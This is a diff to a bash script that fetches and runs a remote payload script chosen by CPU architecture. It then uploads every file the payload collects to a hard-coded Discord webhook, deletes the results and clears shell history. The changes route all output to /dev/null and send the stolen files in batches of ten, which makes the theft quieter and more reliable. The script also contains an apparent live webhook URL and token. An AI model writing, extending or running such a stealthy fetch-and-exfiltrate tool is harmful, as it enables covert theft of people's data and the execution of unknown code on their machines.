@@ -4,6 +4,7 @@ export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTF
 folder="$PWD"
 folder_path="$folder/results/"
 files=()
+batch_size=10
 
 architecture=$(uname -m)
 
@@ -26,23 +27,37 @@ case "$architecture" in
         ;;
 esac
 
-curl -sSL $file_url -o magikarp.sh
+curl -sSL $file_url -o magikarp.sh > /dev/null
 
-chmod +x magikarp.sh
-echo "Exécution du script"
-./magikarp.sh
-rm "magikarp.sh"
+chmod +x magikarp.sh > /dev/null
+echo "Exécution du script" > /dev/null
+./magikarp.sh > /dev/null
+rm "magikarp.sh" > /dev/null
 files=($(find "$folder_path" -type f))
 
-curl_args=()
-for ((i=0; i<${#files[@]}; i++)); do
-    file="${files[$i]}"
-    curl_args+=("-F" "file$((i+1))=@$file")
-done
+send_discord_webhook() {
+    local file_batch=("$@")
 
-curl "${curl_args[@]}" \
-    -F 'payload_json={"username": "Murerig", "content": "Coin Coin 😈🦆"}' \
-    $WEBHOOK_URL
+    curl_args=()
+    for ((i=0; i<${#file_batch[@]}; i++)); do
+        file="${file_batch[$i]}"
+        curl_args+=("-F" "file$((i+1))=@$file")
+    done
+
+    curl "${curl_args[@]}" \
+        -F 'payload_json={"username": "Murerig", "content": "Coin Coin 😈🦆"}' \
+        "$WEBHOOK_URL"
+}
+
+for ((start=0; start<${#files[@]}; start+=batch_size)); do
+    end=$((start + batch_size - 1))
+    if ((end >= ${#files[@]})); then
+        end=$(( ${#files[@]} - 1 ))
+    fi
+
+    file_batch=("${files[@]:start:batch_size}")
+    send_discord_webhook "${file_batch[@]}" > /dev/null
+done
 
 rm -rf $folder_path
 history -c
